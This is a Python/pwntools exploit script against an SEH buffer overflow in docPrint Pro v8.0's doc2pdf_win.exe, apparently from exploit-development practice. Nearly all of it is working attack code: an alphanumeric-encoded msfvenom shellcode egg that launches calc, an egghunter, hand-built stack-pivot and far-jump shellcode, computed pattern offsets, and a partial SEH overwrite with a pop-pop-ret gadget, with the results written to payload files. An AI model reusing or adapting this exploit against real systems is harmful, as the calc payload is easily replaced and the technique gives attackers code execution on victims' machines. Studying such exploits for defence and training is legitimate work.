#!/usr/bin/env python

from helper import *
from pwn import asm, context
context(arch='i386')

# payload = pattern_create(3000)

# msfvenom -p windows/exec CMD=calc --arch x86 --platform windows -e x86/alpha_mixed -f python -v egg
# Found 1 compatible encoders
# Attempting to encode payload with 1 iterations of x86/alpha_mixed
# x86/alpha_mixed succeeded with size 440 (iteration=0)
# x86/alpha_mixed chosen with final size 440
# Payload size: 440 bytes
# Final size of python file: 2145 bytes
egg = "w00t" # single tag for missing space
egg += asm('nop')
egg += asm('and esp, 0xfffffff0') # align stack
egg += "\x89\xe0\xd9\xcb\xd9\x70\xf4\x5e\x56\x59\x49\x49\x49"
egg += "\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
egg += "\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
egg += "\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
egg += "\x58\x50\x38\x41\x42\x75\x4a\x49\x39\x6c\x4b\x58\x6d"
egg += "\x52\x55\x50\x55\x50\x35\x50\x63\x50\x6e\x69\x69\x75"
egg += "\x74\x71\x4f\x30\x53\x54\x6c\x4b\x56\x30\x54\x70\x4c"
egg += "\x4b\x52\x72\x34\x4c\x4c\x4b\x71\x42\x42\x34\x4e\x6b"
egg += "\x63\x42\x66\x48\x56\x6f\x4f\x47\x32\x6a\x67\x56\x64"
egg += "\x71\x39\x6f\x4e\x4c\x57\x4c\x65\x31\x33\x4c\x75\x52"
egg += "\x36\x4c\x47\x50\x69\x51\x5a\x6f\x74\x4d\x45\x51\x39"
egg += "\x57\x6b\x52\x6a\x52\x42\x72\x71\x47\x6c\x4b\x42\x72"
egg += "\x74\x50\x4e\x6b\x31\x5a\x57\x4c\x4c\x4b\x72\x6c\x72"
egg += "\x31\x64\x38\x48\x63\x77\x38\x66\x61\x78\x51\x62\x71"
egg += "\x4e\x6b\x66\x39\x45\x70\x35\x51\x78\x53\x6e\x6b\x50"
egg += "\x49\x42\x38\x78\x63\x77\x4a\x70\x49\x4e\x6b\x75\x64"
egg += "\x4e\x6b\x66\x61\x68\x56\x34\x71\x39\x6f\x4c\x6c\x4f"
egg += "\x31\x38\x4f\x54\x4d\x45\x51\x68\x47\x66\x58\x6d\x30"
egg += "\x31\x65\x39\x66\x55\x53\x31\x6d\x4c\x38\x57\x4b\x51"
egg += "\x6d\x46\x44\x43\x45\x58\x64\x76\x38\x4e\x6b\x76\x38"
egg += "\x36\x44\x43\x31\x4e\x33\x31\x76\x4c\x4b\x76\x6c\x32"
egg += "\x6b\x6c\x4b\x50\x58\x55\x4c\x57\x71\x4e\x33\x4e\x6b"
egg += "\x63\x34\x4c\x4b\x37\x71\x5a\x70\x4b\x39\x50\x44\x47"
egg += "\x54\x57\x54\x43\x6b\x63\x6b\x51\x71\x56\x39\x53\x6a"
egg += "\x52\x71\x59\x6f\x39\x70\x63\x6f\x33\x6f\x72\x7a\x4c"
egg += "\x4b\x75\x42\x5a\x4b\x6e\x6d\x43\x6d\x42\x4a\x33\x31"
egg += "\x6e\x6d\x4e\x65\x58\x32\x57\x70\x53\x30\x45\x50\x30"
egg += "\x50\x33\x58\x30\x31\x6c\x4b\x50\x6f\x6c\x47\x59\x6f"
egg += "\x39\x45\x4d\x6b\x7a\x50\x6f\x45\x4d\x72\x30\x56\x50"
egg += "\x68\x6c\x66\x6e\x75\x4d\x6d\x4f\x6d\x6b\x4f\x78\x55"
egg += "\x37\x4c\x54\x46\x51\x6c\x36\x6a\x4f\x70\x79\x6b\x59"
egg += "\x70\x43\x45\x74\x45\x6d\x6b\x30\x47\x56\x73\x73\x42"
egg += "\x72\x4f\x53\x5a\x57\x70\x51\x43\x79\x6f\x68\x55\x75"
egg += "\x33\x65\x31\x52\x4c\x72\x43\x55\x50\x41\x41"

save_file('egg.txt', egg)

# bash build-egghunter.sh
# Attempting to read payload from STDIN...
# Found 1 compatible encoders
# Attempting to encode payload with 1 iterations of x86/alpha_mixed
# x86/alpha_mixed succeeded with size 144 (iteration=0)
# x86/alpha_mixed chosen with final size 144
# Payload size: 144 bytes
# EIP: 0x00188849
# ESP: 0x00188C49
# hex(0x00188849 - 0x00188C49)
# hex(sub(0x00188849, 0x00188C49))
# "0xfffffc00"
# hex(sub(0x00188849, 0x00188C49) + 17)
# "0xfffffc11"

egghunter = asm('push esp')
egghunter += asm('pop eax')
egghunter += asm('sub eax, 0x20202020')
egghunter += asm('sub eax, 0x61616551')
egghunter += asm('sub eax, 0x7e7e7e7e') # eax = 0xfffffc11
egghunter += 'PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIeayKFQXRScPSPSscmcIPBFoqKzYodOcrrrrJwVv8eaO9oyxbu4Yob33nPZul6ed48ilxpwvPDpBTMYKgloBUZDKOKWAA'

# EIP : 0x00188BF3 -
# ESP : 0x0018800C = 3047
# hex(0x00188BF3 - 0x0018800C)
# '0xbe7'
# hex(3047 + 17)
# '0xbf8'
farjmp = asm('push esp')
farjmp += asm('pop eax')
farjmp += asm('sub eax, 0x20202020')
farjmp += asm('sub eax, 0x6161556a')
farjmp += asm('sub eax, 0x7e7e7e7e') # eax = 0x00000bf8

farjmp += asm('sub eax, 0x20202020')
farjmp += asm('sub eax, 0x61616120')
farjmp += asm('sub eax, 0x7e7e7e73') # eax += 0x0000004d
farjmp += asm('push eax')
farjmp += asm('pop esp')
farjmp += asm('and eax, 0x20202020')
farjmp += asm('and eax, 0x40404040') # eax = 0x00000000
farjmp += asm('sub eax, 0x20202020')
farjmp += asm('sub eax, 0x20202163')
farjmp += asm('sub eax, 0x7d7d7b7e') # eax = 0x424242ff
farjmp += asm('push eax')
farjmp += asm('and eax, 0x20202020')
farjmp += asm('and eax, 0x40404040') # eax = 0x00000000
farjmp += asm('sub eax, 0x20202020')
farjmp += asm('sub eax, 0x61656579')
farjmp += asm('sub eax, 0x7e7e7e7e') # eax = 0xfffbfbe9
farjmp += asm('push eax')
farjmp += asm('dec ecx')
farjmp += asm('dec ecx')
farjmp += asm('dec ecx')
farjmp += asm('dec ecx')
farjmp += asm('dec ecx')
farjmp += asm('dec ecx')
farjmp += asm('dec ecx')
farjmp += asm('dec ecx')

nSEH_offset = pattern_offset('0x39644338')
farjmp_offset = pattern_offset('a6Ca') # 0x61433661
egghunter_offset = pattern_offset('3Av4')

payload = pattern_create(egghunter_offset)

payload += egghunter

payload += fill(payload, farjmp_offset)

payload += farjmp

payload += fill(payload, nSEH_offset)

# nSEH
# metasm > je $-97;jne $-99
# payload += "\x74\x9d\x75\x9b"
payload += asm('je $-97')
payload += asm('jne $-99')

# SEH
# 0x00426635 : pop ecx # pop ecx # ret  | startnull,asciiprint,ascii,alphanum {PAGE_EXECUTE_READ} [doc2pdf_win.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v8.0.0.0 (C:\Program Files (x86)\docPrint Pro v8.0\doc2pdf_win.exe)
payload += p32(0x00426635)[:3] # partial overwrite

save_file("payload.txt", payload)
